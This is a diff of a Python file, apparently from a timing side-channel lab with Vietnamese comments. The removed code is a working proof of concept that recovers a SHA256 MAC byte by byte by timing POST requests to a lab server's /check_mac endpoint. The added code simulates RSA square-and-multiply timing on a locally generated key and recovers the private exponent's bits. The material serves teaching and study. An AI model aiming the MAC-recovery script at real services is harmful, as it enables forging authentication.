@@ -1,97 +1,108 @@
-import requests
+from Crypto.Util.number import *
 import time
-import numpy as np
+import random
+import json
 
-SERVER_URL = "http://server:5000"
-MESSAGE = "user=admin"
-MAC_LEN = 32 # SHA256 tạo ra 32 bytes
-TIME_PER_BYTE = 0.005 # 5ms (phải khớp với giá trị sleep ở server)
-REQUEST_COUNT = 3 # Số lần đo cho mỗi byte để lấy trung bình, chống nhiễu mạng
+p = getPrime(512)
+q = getPrime(512)
+n = p * q
 
-def check_mac_timing(message, mac_hex):
-    """
-    Gửi MAC đến server và trả về thời gian phản hồi (elapsed time).
-    """
-    payload = {
-        'message': message,
-        'mac': mac_hex
-    }
-    
-    try:
-        # Sử dụng perf_counter để có độ chính xác cao
-        start_time = time.perf_counter()
-        requests.post(f"{SERVER_URL}/check_mac", json=payload, timeout=5)
-        end_time = time.perf_counter()
-        
-        return end_time - start_time
-    except requests.exceptions.RequestException:
-        return 0.0
+e = 65537
+d = pow(e,-1,(p-1)*(q-1))
+print(bin(d)[2:])
 
-def main():
-    print("--- Timing Attack PoC (Attack B) ---")
-    print(f"Attacking endpoint: {SERVER_URL}/check_mac")
-    print(f"Target message: '{MESSAGE}'")
-    print("Mục tiêu: Khôi phục MAC (32 bytes) byte-by-byte.")
-    
-    # Khởi tạo MAC rỗng (toàn byte 00)
-    known_mac_bytes = bytearray(MAC_LEN)
-    
-    # Vòng lặp chính: khôi phục từng byte của MAC
-    for i in range(MAC_LEN):
-        print(f"\nĐang tìm byte thứ {i+1}/{MAC_LEN}...")
-        
-        # Lưu trữ thời gian đo được cho từng giá trị byte (0-255)
-        timings = {}
 
-        # Thử tất cả 256 giá trị
-        for byte_val in range(256):
-            # Tạo MAC_guess = [byte_đã_biết] + [byte_đang_thử] + [00...]
-            known_mac_bytes[i] = byte_val
-            guess_mac_hex = known_mac_bytes.hex()
-            
-            measured_times = []
-            for _ in range(REQUEST_COUNT):
-                 measured_times.append(check_mac_timing(MESSAGE, guess_mac_hex))
-            
-            # Lấy thời gian trung bình
-            avg_time = np.mean(measured_times)
-            timings[byte_val] = avg_time
+print(f"p={p}")
+print(f"q={q}")
+print(f"n={n}")
+print(f"d={d}")
+def check_diff(bin1:str,bin2:str) -> int:
+    count = 0
+    for i,(a,b) in enumerate(zip(bin1,bin2)):
+        if a!=b:
+            count +=1
+            print(f"diff at {i}")
+    return count 
 
-        # Phân tích kết quả
-        # Sắp xếp các byte theo thời gian phản hồi, từ cao đến thấp
-        sorted_timings = sorted(timings.items(), key=lambda item: item[1], reverse=True)
-        
-        # Giá trị byte có thời gian phản hồi lâu nhất là byte đúng
-        best_byte, max_time = sorted_timings[0]
-        
-        print(f"  => Byte {i} tìm thấy: {hex(best_byte)} (thời gian: {max_time:.4f}s)")
-        known_mac_bytes[i] = best_byte
 
-        # Kiểm tra nhanh: nếu thời gian trung bình không tăng
-        expected_min_time = TIME_PER_BYTE * (i + 1)
-        if max_time < expected_min_time * 0.8: # Cho phép sai số 20%
-             print(f"  [!] Cảnh báo: Thời gian đo được ({max_time:.4f}s) ")
-             print(f"      thấp hơn dự kiến ({expected_min_time:.4f}s).")
-             print(f"      Kiểm tra lại server, giảm nhiễu mạng hoặc tăng REQUEST_COUNT.")
+def decrypt_rsa(c, d, n):
+    c %= n
+    res = 1
+    bit_time = []
+    for bit in bin(d)[2:]:
+        t0 = time.perf_counter_ns()
+        res = (res * res) % n
+        t1 = time.perf_counter_ns()
+        sq_time = t1 - t0
 
-    
-    print("\n--- TẤN CÔNG HOÀN TẤT ---")
-    final_mac = known_mac_bytes.hex()
-    print(f"  MAC khôi phục được: {final_mac}")
-    
-    # Bước cuối: Gửi MAC đầy đủ để xác nhận
-    print("  Đang gửi MAC vừa tìm được để xác thực...")
-    response = requests.post(
-        f"{SERVER_URL}/check_mac", 
-        json={'message': MESSAGE, 'mac': final_mac}
-    )
-    
-    if response.status_code == 200:
-        print("  => THÀNH CÔNG! Server đã chấp nhận MAC.")
-    else:
-        print(f"  => THẤT BẠI! Server từ chối MAC. {response.text}")
+        mul_time = 0
+        if bit == '1':
+            t2 = time.perf_counter_ns()
+            res = (res * c) % n
+            t3 = time.perf_counter_ns()
+            mul_time = t3 - t2
 
+        bit_time.append((int(bit), sq_time, mul_time))
+    return res, bit_time
 
 if __name__ == "__main__":
-    main()
+    results = []
+
+    for i in range(2000):
+        m = random.randint(2, n - 2)
+        c = pow(m, e, n)
+
+        m_dec, times = decrypt_rsa(c, d, n)
+        ok = (m_dec == m)
+
+        per_bit = [t[1] + t[2] for t in times]
+        total_time = sum(per_bit)
+
+        results.append({
+            "run": i,
+            "ok": ok,
+            "total_time_ns": total_time,
+            "per_bit_time_ns": per_bit
+        })
+
+    with open("output.json", "w") as f:
+        json.dump(results, f, indent=2)
+
+
+
+    import json
+    import statistics
+
+    with open("output.json", "r") as f:
+        runs = json.load(f)
+
+    num_runs = len(runs)
+    num_bits = len(runs[0]["per_bit_time_ns"])
+
+    mean_per_bit = []
+    for bit_idx in range(num_bits):
+        samples = [runs[r]["per_bit_time_ns"][bit_idx] for r in range(num_runs)]
+        mean_t = statistics.mean(samples)
+        mean_per_bit.append(mean_t)
+
+    base_threshold = statistics.median(mean_per_bit)
+
+    def recover_bits(threshold):
+        return "".join(
+            "1" if mean_t > threshold else "0"
+            for mean_t in mean_per_bit
+        )
+
+    print("Số lần đo:", num_runs)
+    print("Số bit của d quan sát được:", num_bits)
+    print("Ngưỡng median:", base_threshold)
+    rec_median = recover_bits(base_threshold)
+    print("\n[median] Chuỗi bit d khôi phục ")
+    print(rec_median)
+
+    a = str(bin(d)[2:])
+    b = str(rec_median)
+    print(check_diff(a,b))
+
+
 
